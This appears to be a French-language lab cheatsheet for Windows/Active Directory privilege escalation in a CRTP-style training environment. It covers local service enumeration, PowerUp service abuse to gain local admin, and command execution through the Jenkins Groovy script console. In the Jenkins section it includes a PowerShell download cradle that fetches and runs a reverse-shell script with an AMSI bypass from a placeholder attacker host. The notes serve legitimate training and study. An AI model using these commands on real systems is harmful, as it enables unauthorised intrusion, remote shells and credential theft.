# Cheatsheet - Privilege escalation

> [!summary] Objectif
> Mesurer les privilèges réels avant de chercher une élévation, puis passer les outils d'audit local standard — et penser aux apps web internes (Jenkins) souvent mal cloisonnées.

> [!abstract] Repérer ≠ Exploiter (couche HÔTE, invisible dans BloodHound)
> Cette fiche = couche **hôte/applicatif** que BloodHound ne voit PAS (services Windows, Jenkins, web, tâches planifiées). La carte ici = l'**énumération locale** ci-dessous, pas le graphe AD.
> - **Repérer** = voir le service/l'app (donne parfois le flag).
> - **Exploiter** = en tirer un **accès** (admin local / SYSTEM / shell) — ce dont les LO suivants ont besoin.

### Check current context

```cmd
whoami /all
```

### Check group membership (local + domaine)

```powershell
Get-LocalGroupMember -Group Administrators
Get-DomainGroupMember -Identity "Domain Admins"
```

Vérifier d'abord qu'un privilège n'est pas déjà présent avant de chercher une escalade inutile.

### Découvrir la surface d'attaque LOCALE (ce que BloodHound ne montre pas)

```powershell
# services non-Microsoft = candidats privesc (AbyssWebServer sort ici)
Get-CimInstance win32_service | ?{$_.PathName -notmatch 'C:\\Windows'} | select Name,StartName,State,PathName

# ports en écoute = applis exposées (Jenkins 8080, SQL 1433, web 80...)
Get-NetTCPConnection -State Listen | select LocalAddress,LocalPort,OwningProcess | sort LocalPort
netstat -ano | findstr LISTENING

# apps installées / autoruns / creds qui traînent
Get-ChildItem 'C:\Program Files','C:\Program Files (x86)' -Directory -EA 0
Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -EA 0
```

C'est CETTE étape qui fait apparaître **Jenkins (port 8080)** et **le service faible** — pas BloodHound. Un port applicatif inattendu ou un service hors `C:\Windows` = piste d'exploitation.

### Automated local checks (ils te DISENT l'exploit)

```powershell
. C:\AD\Tools\PowerUp.ps1 ; Invoke-AllChecks
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\winPEASx64.exe -args
. C:\AD\Tools\PrivEscCheck.ps1 ; Invoke-PrivescCheck
```

Ne lis pas `Invoke-AllChecks` comme une liste de faits : chaque entrée nomme la **faiblesse exploitable** (`Modifiable service`, `Unquoted service path`, `CanRestart: True`) → c'est ta primitive d'abus.

### Exploiter un service Windows faible (ex. AbyssWebServer) — LO5

> [!info] Repérer → Exploiter
> `Get-CimInstance win32_service` / `Invoke-AllChecks` **repère** le service (nom = flag). L'**objectif** = t'en servir pour devenir **admin local**. 3 primitives selon ce que PowerUp remonte :

```powershell
# a) service/binaire modifiable → PowerUp t'ajoute aux admins locaux automatiquement
. C:\AD\Tools\PowerUp.ps1
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx'

# b) binaire remplaçable à la main → écraser l'exe pointé par PathName, puis relancer le service
Restart-Service AbyssWebServer        # ou: sc.exe stop/start ; ou attendre un reboot

# c) unquoted service path → déposer un exe malveillant dans le 1er espace du chemin
```

Vérifier l'élévation (nouvelle session) :
```powershell
net localgroup administrators
whoami /all      # doit montrer le SID S-1-5-32-544 (Administrators)
```

> [!warning] Le flag ≠ l'objectif
> Répondre `AbyssWebServer` (le nom) valide le flag mais ne te donne PAS l'accès. Sans l'abus (a/b/c) → pas d'admin local → tu seras bloqué aux LO qui exigent de dumper des creds. Fais l'exploitation, pas juste l'identification.

### Chaînage — ce que cette étape débloque
Admin local (via service faible) **ou** shell service account (via Jenkins) → dump creds/hash en mémoire ([[Cheatsheet - Post-exploitation]]) → ces secrets alimentent le lateral movement AD ([[Cheatsheet - Lateral movement]]) et souvent le pivot vers dcorp-mgmt (LO7).

### Abuse Jenkins (dcorp-ci) — LO5 / flags F07 & F08

> [!info] Objectif du chemin
> Jenkins tourne sur **dcorp-ci:8080**, sous un **compte de domaine**. But: exec de commande via Jenkins → shell **en tant que le service account** → ce compte a des accès plus larges.

**1. Joindre Jenkins**
```powershell
Get-DomainComputer -Identity dcorp-ci | select dnshostname,ipv4address   # trouver l'IP
```
Navigateur → `http://<dcorp-ci>:8080`

#### Other way

We can ping the domain as well to get the IP of the Jenkins server
![[Pasted image 20260707160622.png]]


**2. S'authentifier → flag F07 (user de la console web)**
- Jenkins n'a souvent **pas de politique de mdp** → teste `username = password`.
- Sinon, la page autorise parfois **Sign up / créer un compte**.
- Le **username avec lequel tu te connectes** = **F07**.

**3. Exécuter une commande** — 2 voies selon tes droits :

*a) Script Console (Groovy)* — si accès admin, va sur `http://<dcorp-ci>:8080/script` :
```groovy
def cmd = "whoami"
println cmd.execute().text
// commande Windows :
println "cmd /c whoami /all".execute().text
```

*b) Build step (droit Configure sur un job)* — projet Freestyle → *Execute Windows batch command* → **Build Now** → lire *Console Output* :
```bat
whoami
whoami /all
```

**4. Identifier le service account → flag F08 (domain user du service Jenkins)**
La sortie de `whoami` (étape 3) = **le compte de domaine qui exécute Jenkins** = **F08** (format `dcorp\xxxx`).

**5. Shell interactif** (pour la suite du lab) — download-cradle dans le build/Groovy :
```bat
powershell -c "iex (iwr http://<ATTAQUANT>:8080/Invoke-PowerShellTcpEx.ps1 -UseBasicParsing)"
```
Listener + hébergement : cf section *Reverse shell* de [[Cheatsheet - Post-exploitation]] (héberger ≠ listener !). `Ex` = déjà armé + bypass AMSI.

> [!tip] Enchaînement
> Une fois shell en tant que service account Jenkins → refais `whoami /all`, cherche ses droits (local admin ? droits AD ?) → souvent le pivot vers dcorp-mgmt / la suite LO7.

**Link**
- [[Enumeration]]
- [[Cheatsheet - Lateral movement]]
- [[Cheatsheet - Post-exploitation]]
- [[Checklist - Méthodologie CRTP]]
